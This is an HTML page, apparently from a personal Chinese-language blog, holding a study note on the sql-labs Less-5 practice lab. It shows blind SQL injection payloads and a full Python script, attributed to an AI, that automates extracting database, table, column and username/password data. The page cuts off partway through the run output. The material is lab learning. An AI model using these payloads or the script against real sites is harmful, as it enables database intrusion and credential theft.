@@ -1,0 +1,766 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.jpg">
+  <link rel="icon" href="/img/logo.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="aidemofashi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="pre {   overflow-y: auto;   max-height: 300px; }   sql-labs less5输入payload    ?id&#x3D;1?id&#x3D;2  回显  You are in………..     You are in………..    视乎是没有回显。根据以前一点点ctf的经验，应该是布尔盲注了，没想到第五题就遇上了。   尝试构建sql注入的p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="note-03">
+<meta property="og:url" content="https://aidemofashi.github.io/2025/02/28/note-03/index.html">
+<meta property="og:site_name" content="aidemofashi&#39;s blog">
+<meta property="og:description" content="pre {   overflow-y: auto;   max-height: 300px; }   sql-labs less5输入payload    ?id&#x3D;1?id&#x3D;2  回显  You are in………..     You are in………..    视乎是没有回显。根据以前一点点ctf的经验，应该是布尔盲注了，没想到第五题就遇上了。   尝试构建sql注入的p">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-02-28T12:48:34.000Z">
+<meta property="article:modified_time" content="2025-03-01T01:40:05.425Z">
+<meta property="article:author" content="aidemofashi">
+<meta property="article:tag" content="sql-labs">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>note-03 - aidemofashi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"aidemofashi.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>aidemofashi&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="http://39.105.15.250/aidemofashi_home/index.html" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/main.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="note-03"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-28 20:48" pubdate>
+          2025年2月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          42 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">note-03</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <style>
+pre {
+  overflow-y: auto;
+  max-height: 300px;
+}
+</style>
+
+<h1 id="sql-labs-less5"><a href="#sql-labs-less5" class="headerlink" title="sql-labs less5"></a>sql-labs less5</h1><p>输入payload  </p>
+<blockquote>
+<p>?id&#x3D;1<br>?id&#x3D;2</p>
+</blockquote>
+<p>回显</p>
+<blockquote>
+<p>You are in………..  </p>
+</blockquote>
+<blockquote>
+<p>You are in………..  </p>
+</blockquote>
+<p>视乎是没有回显。根据以前一点点ctf的经验，应该是布尔盲注了，没想到第五题就遇上了。  </p>
+<p>尝试构建sql注入的paylaod  </p>
+<blockquote>
+<p>?id&#x3D;1’  </p>
+</blockquote>
+<p>回显</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1    </p>
+</blockquote>
+<p>推测后端语句可能为  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;$get_id&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后看csdn</p>
+<p>看到两种解法，经典的是基于时间的布尔盲注，新的是基于xml报错回显的注入</p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>原理是用sql中的  </p>
+<blockquote>
+<p>and if  </p>
+</blockquote>
+<p>返回的布尔值（true,false）然后用if()设置不同的反应，根据反应来判断布尔的值来判断注入查询的数据是否存在吧</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">length</span>函数用法<br>后端语句：<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>()； -- 返回<span class="hljs-keyword">length</span>里的字节或字符长度<br></code></pre></td></tr></table></figure>
+<p>length函数：</p>
+<p>KIMI：  </p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs arcade">MySQL：<span class="hljs-built_in">LENGTH</span> 返回字节长度，CHAR_LENGTH 返回字符长度。<br>PostgreSQL：<span class="hljs-built_in">LENGTH</span> 返回字符长度。<br>SQLite：<span class="hljs-built_in">LENGTH</span> 返回字节长度。<br>SQL Server：LEN 返回字符长度。<br>Oracle：<span class="hljs-built_in">LENGTH</span> 返回字节长度，LENGTHC 返回字符长度。<br><br>PostgreSQL/SQLite/Oracle：使用 <span class="hljs-keyword">CASE</span> 语句。<br><br>SQL Server：使用 <span class="hljs-keyword">CASE</span> 语句或 <span class="hljs-keyword">IF</span>...<span class="hljs-keyword">ELSE</span> 语句。<br><br></code></pre></td></tr></table></figure>
+
+<p>sql中if()语句的用法：  </p>
+<p>KIMI：  </p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lasso">MySQL：<span class="hljs-keyword">IF</span>(expr, true_expr, false_expr)<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IF</span>(<span class="hljs-number">1</span> &gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;True&#x27;</span>, <span class="hljs-string">&#x27;False&#x27;</span>); -- 返回 <span class="hljs-string">&#x27;True&#x27;</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IF</span>(<span class="hljs-number">1</span> &lt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;True&#x27;</span>, <span class="hljs-string">&#x27;False&#x27;</span>); -- 返回 <span class="hljs-string">&#x27;False&#x27;</span><br><br>PostgreSQL/SQLite/Oracle：使用 <span class="hljs-keyword">CASE</span> 语句。<br><br>SQL Server：使用 <span class="hljs-keyword">CASE</span> 语句或 <span class="hljs-keyword">IF</span><span class="hljs-params">...</span><span class="hljs-keyword">ELSE</span> 语句。  <br><br></code></pre></td></tr></table></figure>
+<p>看csdn上，可以用length根据是否有You are in………..来判断；  </p>
+<p>也能用and if sleep的时间延迟来判断；</p>
+<p>根据前几题大概知道数据库名称为’security’为8个字符；  </p>
+<p>payload：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">length</span>(database())=<span class="hljs-number">8</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+  </span><br></code></pre></td></tr></table></figure>
+
+
+<p>payload的逻辑是先用length判断当前所在数据库的名字长度，</p>
+<blockquote>
+<p>如果猜对为8，则让回显延迟5秒，此时因为使用了and，and的右边无法满足布尔值为真，所以不会有回显<br>什么也没有回显，说明猜测字符长度正确；</p>
+</blockquote>
+<blockquote>
+<p>如果猜测错误，则会使得if返回1，让and的两边满足全为真，使得服务器返回‘you are in……’</p>
+</blockquote>
+<p>其中用到了if函数和sleep函数,<br>sleep()函数是让回显延迟指定的时间吧；  </p>
+<p>回到payload</p>
+<p>按照我们设置的延迟可确认确实为8个字符，也就是’security’</p>
+<p>试了一下</p>
+<p>id&#x3D;1’ and if(length(database())&#x3D;’security’,sleep(5),1)–+id&#x3D;1’ and if(length(database())&#x3D;’security’,sleep(5),1)–+</p>
+<p>问了kimi，原来是length()函数只会返回整型数值，而我要用它来对比字符串😅  </p>
+<p><strong>然后是substr()函数</strong>  </p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">SUBSTR(<span class="hljs-keyword">string</span>, <span class="hljs-built_in">start</span>, <span class="hljs-built_in">length</span>)<br><br><span class="hljs-keyword">string</span>：原始字符串。<br><span class="hljs-built_in">start</span>：子字符串的起始位置（从 <span class="hljs-number">1</span> 开始计数）。<br><span class="hljs-built_in">length</span>：要提取的子字符串的长度。<br></code></pre></td></tr></table></figure>
+
+<p>ascii()</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ASCII(character_expression)<br><br>character_expression：可以是单个字符、字符串字面值或列名。该参数必须是字符类型（如 <span class="hljs-type">CHAR</span> 或 <span class="hljs-type">VARCHAR</span>）。<br></code></pre></td></tr></table></figure>
+<p>一定要转成ascii吗？<br>试了一下</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr(database(),1,1)=&#x27;</span>s<span class="hljs-string">&#x27;,sleep(5),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">8</span>)=<span class="hljs-string">&#x27;security&#x27;</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<p>确实能直接猜测字符了!</p>
+<p>如果有python脚本的话……<br>k：有的兄弟，有的</p>
+<p>KIMI：  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>//配置<br>TARGET_URL = <span class="hljs-string">&quot;http://localhost:32768/Less-5/&quot;</span>  // 目标URL<br>TRUE_STRING = <span class="hljs-string">&quot;You are in...........&quot;</span>  // 数据库判断成功的响应标志<br>CHARSET = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!&quot;</span>  // 测试字符集<br>HEADERS = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&quot;</span><br>&#125;<br><br>//发送请求<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">payload</span>):<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET_URL&#125;</span>?id=1&#x27; AND <span class="hljs-subst">&#123;payload&#125;</span> --+&quot;</span><br>    response = requests.get(url, headers=HEADERS)<br>    <span class="hljs-keyword">return</span> response.text<br>// 获取长度<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>(<span class="hljs-params">query</span>):<br>    length = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;LENGTH(<span class="hljs-subst">&#123;query&#125;</span>)=<span class="hljs-subst">&#123;length&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 长度为: <span class="hljs-subst">&#123;length&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> length<br>        length += <span class="hljs-number">1</span><br>// 逐字符获取字符串<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_string</span>(<span class="hljs-params">query, length</span>):<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取第 <span class="hljs-subst">&#123;i&#125;</span> 个字符...&quot;</span>)<br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> CHARSET:<br>            payload = <span class="hljs-string">f&quot;SUBSTR(<span class="hljs-subst">&#123;query&#125;</span>,<span class="hljs-subst">&#123;i&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;&quot;</span><br>            response = send_payload(payload)<br>            <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                result += char<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 当前结果: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> result<br><br>// 主函数<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    // 获取数据库名<br>    db_length = get_length(<span class="hljs-string">&quot;DATABASE()&quot;</span>)<br>    db_name = get_string(<span class="hljs-string">&quot;DATABASE()&quot;</span>, db_length)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据库名: <span class="hljs-subst">&#123;db_name&#125;</span>&quot;</span>)<br><br>    // 获取表名<br>    table_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=<span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        table_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 表数量: <span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span>)<br><br>    // 获取所有表名<br>    table_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(table_count):<br>        tbl_length = get_length(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        tbl_name = get_string(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, tbl_length)<br>        table_names.append(tbl_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 表名: <span class="hljs-subst">&#123;tbl_name&#125;</span>&quot;</span>)<br><br>    // 获取字段名（以users表为例）<br>    target_table = <span class="hljs-string">&quot;users&quot;</span>  // 替换为目标表名<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取<span class="hljs-subst">&#123;target_table&#125;</span>表的字段...&quot;</span>)<br>    field_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE())=<span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        field_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 字段数量: <span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span>)<br><br>    // 获取字段名<br>    field_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        fld_length = get_length(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        fld_name = get_string(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, fld_length)<br>        field_names.append(fld_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 字段名: <span class="hljs-subst">&#123;fld_name&#125;</span>&quot;</span>)<br><br>    // 获取数据<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取<span class="hljs-subst">&#123;target_table&#125;</span>表的数据...&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        <span class="hljs-keyword">if</span> field_names[i] <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>]:  // 获取用户名和密码字段<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取字段: <span class="hljs-subst">&#123;field_names[i]&#125;</span>&quot;</span>)<br>            data_count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM <span class="hljs-subst">&#123;target_table&#125;</span>)=<span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span><br>                response = send_payload(payload)<br>                <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                    <span class="hljs-keyword">break</span><br>                data_count += <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据条数: <span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data_count):<br>                data_length = get_length(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>)<br>                data = get_string(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>, data_length)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据[<span class="hljs-subst">&#123;j+<span class="hljs-number">1</span>&#125;</span>]: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<p>这是直接猜测字符而不猜测其ascii码的<br>改了一下  </p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">sr</span> <span class="hljs-operator">=</span> string.printable<br><span class="hljs-attribute">CHARSET</span> <span class="hljs-operator">=</span> sr  //<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!&quot;</span>  // 测试字符集<br></code></pre></td></tr></table></figure>
+<p>因为我也不敢确定ai给出的字符是完整且编码正确的  </p>
+<p>恕我只是个脚本小子，能学懂原理先吧  </p>
+<p>运行结果</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 